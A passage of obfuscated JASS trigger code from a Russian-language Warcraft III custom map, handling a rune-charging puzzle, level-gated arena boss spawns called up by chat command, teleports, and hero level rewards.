call CreateTextTagUnitBJ("Продолжать заряжать руны!",JX,0,15.,100.,0.,100.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
else
set TF=1
call CreateTextTagUnitBJ("Начинай заново, неудачник!",JX,0,15.,100.,0.,100.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
endif
else
endif
if B44() then
if B43() then
set TF=8
call CreateNUnitsAtLoc(1,$68303436,Player(11),GetRectCenter(EQ),bj_UNIT_FACING)
call IssueTargetOrderBJ(GetLastCreatedUnit(),"chainlightning",JX)
call AddSpecialEffectTargetUnitBJ("origin",GetTriggerUnit(),"Abilities\\Spells\\Orc\\WarStomp\\WarStompCaster.mdl")
call DestroyEffect(GetLastCreatedEffectBJ())
call CreateTextTagUnitBJ("Мои поздравления. Готовтесь!",JX,0,15.,100.,0.,100.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
call CreateNUnitsAtLoc(1,$6E303856,Player(PLAYER_NEUTRAL_PASSIVE),GetRectCenter(Ga),bj_UNIT_FACING)
call RemoveUnit(JX)
else
set TF=1
call CreateTextTagUnitBJ("Начинай заново, неудачник!",JX,0,15.,100.,0.,100.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
endif
else
endif
endfunction
function B46 takes nothing returns nothing
set VU=CreateTrigger()
call DisableTrigger(VU)
call TriggerRegisterAnyUnitEventBJ(VU,EVENT_PLAYER_UNIT_SPELL_EFFECT)
call TriggerAddCondition(VU,Condition(function B4q))
call TriggerAddAction(VU,function B45)
endfunction
function B47 takes nothing returns boolean
if not (GetSpellAbilityId()==$41305459) then
return false
endif
return true
endfunction
function B48 takes nothing returns boolean
if not (TF==1) then
return false
endif
return true
endfunction
function B49 takes nothing returns boolean
if not (RectContainsUnit(EP,GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function B5B takes nothing returns boolean
if not (TF==2) then
return false
endif
return true
endfunction
function B5C takes nothing returns boolean
if not (RectContainsUnit(EV,GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function B5D takes nothing returns boolean
if not (TF==3) then
return false
endif
return true
endfunction
function B5E takes nothing returns boolean
if not (RectContainsUnit(EQ,GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function B5F takes nothing returns boolean
if not (TF==4) then
return false
endif
return true
endfunction
function B5G takes nothing returns boolean
if not (RectContainsUnit(ES,GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function B5H takes nothing returns boolean
if not (TF==5) then
return false
endif
return true
endfunction
function B5I takes nothing returns boolean
if not (RectContainsUnit(ER,GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function B5J takes nothing returns boolean
if not (TF==6) then
return false
endif
return true
endfunction
function B5K takes nothing returns boolean
if not (RectContainsUnit(ET,GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function B5L takes nothing returns boolean
if not (TF==7) then
return false
endif
return true
endfunction
function B5M takes nothing returns boolean
if not (RectContainsUnit(EU,GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function B5N takes nothing returns nothing
if B49() then
if B48() then
set TF=2
call CreateNUnitsAtLoc(1,$68303436,Player(11),GetRectCenter(EP),bj_UNIT_FACING)
call IssueTargetOrderBJ(GetLastCreatedUnit(),"chainlightning",JX)
call AddSpecialEffectTargetUnitBJ("origin",GetTriggerUnit(),"Abilities\\Spells\\Orc\\WarStomp\\WarStompCaster.mdl")
call DestroyEffect(GetLastCreatedEffectBJ())
call CreateTextTagUnitBJ("Продолжать заряжать руны!",JX,0,15.,100.,0.,100.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
else
set TF=1
call CreateTextTagUnitBJ("Начинай заново, неудачник!",JX,0,15.,100.,0.,100.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
endif
else
endif
if B5C() then
if B5B() then
set TF=3
call CreateNUnitsAtLoc(1,$68303436,Player(11),GetRectCenter(EV),bj_UNIT_FACING)
call IssueTargetOrderBJ(GetLastCreatedUnit(),"chainlightning",JX)
call AddSpecialEffectTargetUnitBJ("origin",GetTriggerUnit(),"Abilities\\Spells\\Orc\\WarStomp\\WarStompCaster.mdl")
call DestroyEffect(GetLastCreatedEffectBJ())
call CreateTextTagUnitBJ("Продолжать заряжать руны!",JX,0,15.,100.,0.,100.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
else
set TF=1
call CreateTextTagUnitBJ("Начинай заново, неудачник!",JX,0,15.,100.,0.,100.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
endif
else
endif
if B5E() then
if B5D() then
set TF=4
call CreateNUnitsAtLoc(1,$68303436,Player(11),GetRectCenter(EQ),bj_UNIT_FACING)
call IssueTargetOrderBJ(GetLastCreatedUnit(),"chainlightning",JX)
call AddSpecialEffectTargetUnitBJ("origin",GetTriggerUnit(),"Abilities\\Spells\\Orc\\WarStomp\\WarStompCaster.mdl")
call DestroyEffect(GetLastCreatedEffectBJ())
call CreateTextTagUnitBJ("Продолжать заряжать руны!",JX,0,15.,100.,0.,100.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
else
set TF=1
call CreateTextTagUnitBJ("Начинай заново, неудачник!",JX,0,15.,100.,0.,100.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
endif
else
endif
if B5G() then
if B5F() then
set TF=5
call CreateNUnitsAtLoc(1,$68303436,Player(11),GetRectCenter(ES),bj_UNIT_FACING)
call IssueTargetOrderBJ(GetLastCreatedUnit(),"chainlightning",JX)
call AddSpecialEffectTargetUnitBJ("origin",GetTriggerUnit(),"Abilities\\Spells\\Orc\\WarStomp\\WarStompCaster.mdl")
call DestroyEffect(GetLastCreatedEffectBJ())
call CreateTextTagUnitBJ("Продолжать заряжать руны!",JX,0,15.,100.,0.,100.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
else
set TF=1
call CreateTextTagUnitBJ("Начинай заново, неудачник!",JX,0,15.,100.,0.,100.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
endif
else
endif
if B5I() then
if B5H() then
set TF=6
call CreateNUnitsAtLoc(1,$68303436,Player(11),GetRectCenter(ER),bj_UNIT_FACING)
call IssueTargetOrderBJ(GetLastCreatedUnit(),"chainlightning",JX)
call AddSpecialEffectTargetUnitBJ("origin",GetTriggerUnit(),"Abilities\\Spells\\Orc\\WarStomp\\WarStompCaster.mdl")
call DestroyEffect(GetLastCreatedEffectBJ())
call CreateTextTagUnitBJ("Продолжать заряжать руны!",JX,0,15.,100.,0.,100.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
else
set TF=1
call CreateTextTagUnitBJ("Начинай заново, неудачник!",JX,0,15.,100.,0.,100.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
endif
else
endif
if B5K() then
if B5J() then
set TF=7
call CreateNUnitsAtLoc(1,$68303436,Player(11),GetRectCenter(ET),bj_UNIT_FACING)
call IssueTargetOrderBJ(GetLastCreatedUnit(),"chainlightning",JX)
call AddSpecialEffectTargetUnitBJ("origin",GetTriggerUnit(),"Abilities\\Spells\\Orc\\WarStomp\\WarStompCaster.mdl")
call DestroyEffect(GetLastCreatedEffectBJ())
call CreateTextTagUnitBJ("Продолжать заряжать руны!",JX,0,15.,100.,0.,100.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
else
set TF=1
call CreateTextTagUnitBJ("Начинай заново, неудачник!",JX,0,15.,100.,0.,100.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
endif
else
endif
if B5M() then
if B5L() then
set TF=8
call CreateNUnitsAtLoc(1,$68303436,Player(11),GetRectCenter(EU),bj_UNIT_FACING)
call IssueTargetOrderBJ(GetLastCreatedUnit(),"chainlightning",JX)
call AddSpecialEffectTargetUnitBJ("origin",GetTriggerUnit(),"Abilities\\Spells\\Orc\\WarStomp\\WarStompCaster.mdl")
call DestroyEffect(GetLastCreatedEffectBJ())
call CreateTextTagUnitBJ("Мои поздравления. Готовтесь!",JX,0,15.,100.,0.,100.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
call CreateNUnitsAtLoc(1,$6E303856,Player(PLAYER_NEUTRAL_PASSIVE),GetRectCenter(Ga),bj_UNIT_FACING)
call RemoveUnit(JX)
else
set TF=1
call CreateTextTagUnitBJ("Начинай заново, неудачник!",JX,0,15.,100.,0.,100.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
endif
else
endif
endfunction
function B5O takes nothing returns nothing
set VV=CreateTrigger()
call DisableTrigger(VV)
call TriggerRegisterAnyUnitEventBJ(VV,EVENT_PLAYER_UNIT_SPELL_EFFECT)
call TriggerAddCondition(VV,Condition(function B47))
call TriggerAddAction(VV,function B5N)
endfunction
function B5P takes nothing returns boolean
if not (IsUnitType(GetTriggerUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
return true
endfunction
function B5Q takes nothing returns nothing
local integer L9=0
call CreateFogModifierRectBJ(true,Player(0),FOG_OF_WAR_VISIBLE,FW)
set V0=Location(5888.,11600.)
call SetUnitPositionLoc(GetTriggerUnit(),V0)
call PanCameraToTimedLocForPlayer(GetOwningPlayer(GetTriggerUnit()),V0,0)
call RemoveLocation(V0)
call SetUnitOwner(Kx,Player(PLAYER_NEUTRAL_PASSIVE),true)
call SetUnitPositionLoc(Kx,GetRectCenter(FW))
call ShowUnit(Kx,true)
call SetUnitInvulnerable(Kx,true)
call SetUnitLifePercentBJ(Kx,100)
set Tt[10]=90.
set Tt[11]=85.
set Tt[12]=75.
set Tt[13]=98.
set Tt[14]=90.
if GetUnitAbilityLevel(Kx,$41304456)>=1 then
set Tt[15]=97.
endif
call SaveInteger(NY,GetHandleId(Kx),1,0)
loop
call SaveInteger(NY,GetHandleId(Kx),2+L9,0)
set L9=L9+1
exitwhen L9==7
endloop
endfunction
function B5R takes nothing returns nothing
set dj=CreateTrigger()
call DisableTrigger(dj)
call TriggerRegisterEnterRectSimple(dj,Ga)
call TriggerAddCondition(dj,Condition(function B5P))
call TriggerAddAction(dj,function B5Q)
endfunction
function B5S takes nothing returns boolean
if not (IsUnitType(GetTriggerUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
return true
endfunction
function B5T takes nothing returns nothing
call RemoveItem(GetEnumItem())
endfunction
function B5U takes nothing returns nothing
call RemoveItem(GetEnumItem())
endfunction
function B5V takes nothing returns boolean
if not (GetUnitLevel(GetTriggerUnit())>=TR[1]) then
return false
endif
if not (GetUnitLevel(GetTriggerUnit())<=TR[2]) then
return false
endif
return true
endfunction
function B5W takes nothing returns nothing
if B5V() then
call EnumItemsInRectBJ(DU,function B5T)
call EnumItemsInRectBJ(FT,function B5U)
call SetUnitPositionLoc(GetTriggerUnit(),GetRectCenter(FC))
call PanCameraToTimedLocForPlayer(GetOwningPlayer(GetTriggerUnit()),GetRectCenter(FC),0)
else
call DisplayTextToForce(GetForceOfPlayer(GetOwningPlayer(GetTriggerUnit())),"|c00ff9696Ваш Уровень не соответствует боссу Арены!")
endif
endfunction
function B5X takes nothing returns nothing
set ix=CreateTrigger()
call TriggerRegisterEnterRectSimple(ix,DS)
call TriggerAddCondition(ix,Condition(function B5S))
call TriggerAddAction(ix,function B5W)
endfunction
function B5Y takes nothing returns boolean
if not (IsUnitType(GetTriggerUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
return true
endfunction
function B5Z takes nothing returns nothing
call SetUnitPositionLoc(GetTriggerUnit(),GetRectCenter(BB))
call PanCameraToTimedLocForPlayer(GetOwningPlayer(GetTriggerUnit()),GetRectCenter(BB),0)
endfunction
function B5a takes nothing returns nothing
set iy=CreateTrigger()
call TriggerRegisterEnterRectSimple(iy,DR)
call TriggerAddCondition(iy,Condition(function B5Y))
call TriggerAddAction(iy,function B5Z)
endfunction
function B5b takes nothing returns boolean
if not (RectContainsUnit(E0,MT[GetConvertedPlayerId(GetTriggerPlayer())-1])==true) then
return false
endif
return true
endfunction
function B5c takes nothing returns nothing
call RemoveUnit(GetEnumUnit())
endfunction
function B5d takes nothing returns nothing
local location Ht=Location(-15500,2290)
call SetUnitPositionLoc(GetEnumUnit(),Ht)
call RemoveLocation(Ht)
set Ht=null
endfunction
function B5e takes nothing returns nothing
local location Ht
local group Na=CreateGroup()
local boolexpr i0
if GetUnitLevel(MT[GetPlayerId(GetTriggerPlayer())])>=1 and GetUnitLevel(MT[GetPlayerId(GetTriggerPlayer())])<=5 then
set TR[1]=1
set TR[2]=5
set Ht=Location(-15700,-130)
call SetUnitPositionLoc(Js,Ht)
set i0=Condition(function mx)
call GroupEnumUnitsInRect(Na,FC,i0)
call ForGroup(Na,function B5c)
set i0=Condition(function mw)
call GroupEnumUnitsInRect(Na,FC,i0)
call ForGroup(Na,function B5d)
call DestroyBoolExpr(i0)
call DestroyGroup(Na)
call RemoveLocation(Ht)
set Ht=Location(-13900,14770)
call CreateUnit(Player(10),$65303044,GetLocationX(Ht),GetLocationY(Ht),0)
call RemoveLocation(Ht)
call BJDebugMsg("|c00ff9696Внимание|r: на |c00ffff00Арене|r для сражения доступен |c00ff7f00Treant|r. Уровень входа: |c0000ff001-5|r")
elseif GetUnitLevel(MT[GetPlayerId(GetTriggerPlayer())])>=6 and GetUnitLevel(MT[GetPlayerId(GetTriggerPlayer())])<=10 then
set TR[1]=6
set TR[2]=10
set Ht=Location(-15700,-130)
call SetUnitPositionLoc(Js,Ht)
set i0=Condition(function mx)
call GroupEnumUnitsInRect(Na,FC,i0)
call ForGroup(Na,function B5c)
set i0=Condition(function mw)
call GroupEnumUnitsInRect(Na,FC,i0)
call ForGroup(Na,function B5d)
call DestroyBoolExpr(i0)
call DestroyGroup(Na)
call RemoveLocation(Ht)
set Ht=Location(-13900,14770)
call CreateUnit(Player(10),$6E30334D,GetLocationX(Ht),GetLocationY(Ht),0)
call RemoveLocation(Ht)
call BJDebugMsg("|c00ff9696Внимание|r: на |c00ffff00Арене|r для сражения доступен |c00ff7f00Вождь Беорнов|r. Уровень входа: |c0000ff006-10|r")
elseif GetUnitLevel(MT[GetPlayerId(GetTriggerPlayer())])>=11 and GetUnitLevel(MT[GetPlayerId(GetTriggerPlayer())])<=15 then
set TR[1]=11
set TR[2]=15
set Ht=Location(-15700,-130)
call SetUnitPositionLoc(Js,Ht)
set i0=Condition(function mx)
call GroupEnumUnitsInRect(Na,FC,i0)
call ForGroup(Na,function B5c)
set i0=Condition(function mw)
call GroupEnumUnitsInRect(Na,FC,i0)
call ForGroup(Na,function B5d)
call DestroyBoolExpr(i0)
call DestroyGroup(Na)
call RemoveLocation(Ht)
set Ht=Location(-13900,14770)
call CreateUnit(Player(10),$6E30334F,GetLocationX(Ht),GetLocationY(Ht),0)
call RemoveLocation(Ht)
call BJDebugMsg("|c00ff9696Внимание|r: на |c00ffff00Арене|r для сражения доступен |c00ff7f00Паук|r. Уровень входа: |c0000ff0011-15|r")
elseif GetUnitLevel(MT[GetPlayerId(GetTriggerPlayer())])>=16 and GetUnitLevel(MT[GetPlayerId(GetTriggerPlayer())])<=20 then
set TR[1]=16
set TR[2]=20
set Ht=Location(-15700,-130)
call SetUnitPositionLoc(Js,Ht)
set i0=Condition(function mx)
call GroupEnumUnitsInRect(Na,FC,i0)
call ForGroup(Na,function B5c)
set i0=Condition(function mw)
call GroupEnumUnitsInRect(Na,FC,i0)
call ForGroup(Na,function B5d)
call DestroyBoolExpr(i0)
call DestroyGroup(Na)
call RemoveLocation(Ht)
set Ht=Location(-13900,14770)
call CreateUnit(Player(10),$6E303350,GetLocationX(Ht),GetLocationY(Ht),0)
call RemoveLocation(Ht)
call BJDebugMsg("|c00ff9696Внимание|r: на |c00ffff00Арене|r для сражения доступен |c00ff7f00Серинокс|r. Уровень входа: |c0000ff0016-20|r")
elseif GetUnitLevel(MT[GetPlayerId(GetTriggerPlayer())])>=21 and GetUnitLevel(MT[GetPlayerId(GetTriggerPlayer())])<=25 then
set TR[1]=21
set TR[2]=25
set Ht=Location(-15700,-130)
call SetUnitPositionLoc(Js,Ht)
set i0=Condition(function mx)
call GroupEnumUnitsInRect(Na,FC,i0)
call ForGroup(Na,function B5c)
set i0=Condition(function mw)
call GroupEnumUnitsInRect(Na,FC,i0)
call ForGroup(Na,function B5d)
call DestroyBoolExpr(i0)
call DestroyGroup(Na)
call RemoveLocation(Ht)
set Ht=Location(-13900,14770)
call CreateUnit(Player(10),$6E303351,GetLocationX(Ht),GetLocationY(Ht),0)
call RemoveLocation(Ht)
call BJDebugMsg("|c00ff9696Внимание|r: на |c00ffff00Арене|r для сражения доступен |c00ff7f00Осадный Голем|r. Уровень входа: |c0000ff0021-25|r")
elseif GetUnitLevel(MT[GetPlayerId(GetTriggerPlayer())])>=26 and GetUnitLevel(MT[GetPlayerId(GetTriggerPlayer())])<=30 then
set TR[1]=26
set TR[2]=30
set Ht=Location(-15700,-130)
call SetUnitPositionLoc(Js,Ht)
set i0=Condition(function mx)
call GroupEnumUnitsInRect(Na,FC,i0)
call ForGroup(Na,function B5c)
set i0=Condition(function mw)
call GroupEnumUnitsInRect(Na,FC,i0)
call ForGroup(Na,function B5d)
call DestroyBoolExpr(i0)
call DestroyGroup(Na)
call RemoveLocation(Ht)
set Ht=Location(-13900,14770)
call CreateUnit(Player(10),$75303048,GetLocationX(Ht),GetLocationY(Ht),0)
call RemoveLocation(Ht)
call BJDebugMsg("|c00ff9696Внимание|r: на |c00ffff00Арене|r для сражения доступна |c00ff7f00Обсидиановая Статуя|r. Уровень входа: |c0000ff0026-30|r")
elseif GetUnitLevel(MT[GetPlayerId(GetTriggerPlayer())])>=31 and GetUnitLevel(MT[GetPlayerId(GetTriggerPlayer())])<=35 then
set TR[1]=31
set TR[2]=35
set Ht=Location(-15700,-130)
call SetUnitPositionLoc(Js,Ht)
set i0=Condition(function mx)
call GroupEnumUnitsInRect(Na,FC,i0)
call ForGroup(Na,function B5c)
set i0=Condition(function mw)
call GroupEnumUnitsInRect(Na,FC,i0)
call ForGroup(Na,function B5d)
call DestroyBoolExpr(i0)
call DestroyGroup(Na)
call RemoveLocation(Ht)
set Ht=Location(-13900,14770)
call CreateUnit(Player(10),$68303056,GetLocationX(Ht),GetLocationY(Ht),0)
call RemoveLocation(Ht)
call BJDebugMsg("|c00ff9696Внимание|r: на |c00ffff00Арене|r для сражения доступен |c00ff7f00Краб-отшельник|r. Уровень входа: |c0000ff0031-35|r")
elseif GetUnitLevel(MT[GetPlayerId(GetTriggerPlayer())])>=36 and GetUnitLevel(MT[GetPlayerId(GetTriggerPlayer())])<=40 then
set TR[1]=36
set TR[2]=40
set Ht=Location(-15700,-130)
call SetUnitPositionLoc(Js,Ht)
set i0=Condition(function mx)
call GroupEnumUnitsInRect(Na,FC,i0)
call ForGroup(Na,function B5c)
set i0=Condition(function mw)
call GroupEnumUnitsInRect(Na,FC,i0)
call ForGroup(Na,function B5d)
call DestroyBoolExpr(i0)
call DestroyGroup(Na)
call RemoveLocation(Ht)
set Ht=Location(-13900,14770)
call CreateUnit(Player(10),$6830305A,GetLocationX(Ht),GetLocationY(Ht),0)
call RemoveLocation(Ht)
call BJDebugMsg("|c00ff9696Внимание|r: на |c00ffff00Арене|r для сражения доступен |c00ff7f00Fire Boss|r. Уровень входа: |c0000ff0036-40|r")
elseif GetUnitLevel(MT[GetPlayerId(GetTriggerPlayer())])>=41 and GetUnitLevel(MT[GetPlayerId(GetTriggerPlayer())])<=45 then
set TR[1]=41
set TR[2]=45
set Ht=Location(-15700,-130)
call SetUnitPositionLoc(Js,Ht)
set i0=Condition(function mx)
call GroupEnumUnitsInRect(Na,FC,i0)
call ForGroup(Na,function B5c)
set i0=Condition(function mw)
call GroupEnumUnitsInRect(Na,FC,i0)
call ForGroup(Na,function B5d)
call DestroyBoolExpr(i0)
call DestroyGroup(Na)
call RemoveLocation(Ht)
set Ht=Location(-13900,14770)
call CreateUnit(Player(10),$68303130,GetLocationX(Ht),GetLocationY(Ht),0)
call RemoveLocation(Ht)
call BJDebugMsg("|c00ff9696Внимание|r: на |c00ffff00Арене|r для сражения доступен |c00ff7f00Venom Boss|r. Уровень входа: |c0000ff0041-45|r")
elseif GetUnitLevel(MT[GetPlayerId(GetTriggerPlayer())])>=46 and GetUnitLevel(MT[GetPlayerId(GetTriggerPlayer())])<=50 then
set TR[1]=46
set TR[2]=50
set Ht=Location(-15700,-130)
call SetUnitPositionLoc(Js,Ht)
set i0=Condition(function mx)
call GroupEnumUnitsInRect(Na,FC,i0)
call ForGroup(Na,function B5c)
set i0=Condition(function mw)
call GroupEnumUnitsInRect(Na,FC,i0)
call ForGroup(Na,function B5d)
call DestroyBoolExpr(i0)
call DestroyGroup(Na)
call RemoveLocation(Ht)
set Ht=Location(-13900,14770)
call CreateUnit(Player(10),$68303059,GetLocationX(Ht),GetLocationY(Ht),0)
call RemoveLocation(Ht)
call BJDebugMsg("|c00ff9696Внимание|r: на |c00ffff00Арене|r для сражения доступен |c00ff7f00Water Boss|r. Уровень входа: |c0000ff0046-50|r")
elseif GetUnitLevel(MT[GetPlayerId(GetTriggerPlayer())])>=51 then
set TR[1]=51
set TR[2]=60
set Ht=Location(-15700,-130)
call SetUnitPositionLoc(Js,Ht)
set i0=Condition(function mx)
call GroupEnumUnitsInRect(Na,FC,i0)
call ForGroup(Na,function B5c)
set i0=Condition(function mw)
call GroupEnumUnitsInRect(Na,FC,i0)
call ForGroup(Na,function B5d)
call DestroyBoolExpr(i0)
call DestroyGroup(Na)
call RemoveLocation(Ht)
set Ht=Location(-13900,14770)
call CreateUnit(Player(10),$68303554,GetLocationX(Ht),GetLocationY(Ht),0)
call RemoveLocation(Ht)
call BJDebugMsg("|c00ff9696Внимание|r: на |c00ffff00Арене|r для сражения доступен |c00ff7f00Темный Феникс|r. Уровень входа: |c0000ff0051+|r")
endif
call DestroyBoolExpr(i0)
call DestroyGroup(Na)
call RemoveLocation(Ht)
set Ht=null
set i0=null
set Na=null
endfunction
function B5f takes nothing returns nothing
set iz=CreateTrigger()
call TriggerRegisterPlayerChatEvent(iz,Player(0),"-бой",true)
call TriggerRegisterPlayerChatEvent(iz,Player(1),"-бой",true)
call TriggerRegisterPlayerChatEvent(iz,Player(2),"-бой",true)
call TriggerRegisterPlayerChatEvent(iz,Player(3),"-бой",true)
call TriggerRegisterPlayerChatEvent(iz,Player(4),"-бой",true)
call TriggerRegisterPlayerChatEvent(iz,Player(5),"-бой",true)
call TriggerRegisterPlayerChatEvent(iz,Player(6),"-бой",true)
call TriggerRegisterPlayerChatEvent(iz,Player(7),"-бой",true)
call TriggerRegisterPlayerChatEvent(iz,Player(0),"-fight",true)
call TriggerRegisterPlayerChatEvent(iz,Player(1),"-fight",true)
call TriggerRegisterPlayerChatEvent(iz,Player(2),"-fight",true)
call TriggerRegisterPlayerChatEvent(iz,Player(3),"-fight",true)
call TriggerRegisterPlayerChatEvent(iz,Player(4),"-fight",true)
call TriggerRegisterPlayerChatEvent(iz,Player(5),"-fight",true)
call TriggerRegisterPlayerChatEvent(iz,Player(6),"-fight",true)
call TriggerRegisterPlayerChatEvent(iz,Player(7),"-fight",true)
call TriggerRegisterPlayerChatEvent(iz,Player(0),"-,jq",true)
call TriggerRegisterPlayerChatEvent(iz,Player(1),"-,jq",true)
call TriggerRegisterPlayerChatEvent(iz,Player(2),"-,jq",true)
call TriggerRegisterPlayerChatEvent(iz,Player(3),"-,jq",true)
call TriggerRegisterPlayerChatEvent(iz,Player(4),"-,jq",true)
call TriggerRegisterPlayerChatEvent(iz,Player(5),"-,jq",true)
call TriggerRegisterPlayerChatEvent(iz,Player(6),"-,jq",true)
call TriggerRegisterPlayerChatEvent(iz,Player(7),"-,jq",true)
call TriggerAddCondition(iz,Condition(function B5b))
call TriggerAddAction(iz,function B5e)
endfunction
function B5g takes nothing returns boolean
if not (RectContainsUnit(FC,GetTriggerUnit())==true) then
return false
endif
if not (GetUnitTypeId(GetTriggerUnit())!=$68303555) then
return false
endif
return true
endfunction
function B5h takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function B5i takes nothing returns boolean
if not (GetUnitAbilityLevel(GetEnumUnit(),$41314452)==0) then
return false
endif
if not (GetUnitLevel(GetEnumUnit())<=5) then
return false
endif
return true
endfunction
function B5j takes nothing returns nothing
if B5i() then
call UnitAddAbility(GetEnumUnit(),$41314452)
set NF=false
call UnitAddItemByIdSwapped($4930304C,GetEnumUnit())
call SetItemUserData(GetLastCreatedItem(),GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit())))
set NF=true
call SetHeroLevel(GetEnumUnit(),GetUnitLevel(GetEnumUnit())+2,false)
set Tm[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]=Tm[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]+2
set NJ[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]=NJ[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]+600
set NK[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]=NK[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]+30
else
endif
endfunction
function B5k takes nothing returns boolean
if not (GetUnitTypeId(GetTriggerUnit())==$65303044) then
return false
endif
return true
endfunction
function B5l takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function B5m takes nothing returns boolean
if not (UnitHasItemOfTypeBJ(GetEnumUnit(),$4930304C)==true) then
return false
endif
if not (GetUnitAbilityLevel(GetEnumUnit(),$41314452)==1) then
return false
endif
if not (IsUnitAliveBJ(GetEnumUnit())==true) then
return false
endif
if not (GetUnitLevel(GetEnumUnit())>=6) then
return false
endif
if not (GetUnitLevel(GetEnumUnit())<=10) then
return false
endif
return true
endfunction
function B5n takes nothing returns nothing
if B5m() then
call SetUnitAbilityLevelSwapped($41314452,GetEnumUnit(),2)
call RemoveItem(GetItemOfTypeFromUnitBJ(GetEnumUnit(),$4930304C))
set NF=false
call UnitAddItemByIdSwapped($49304739,GetEnumUnit())
set NF=true
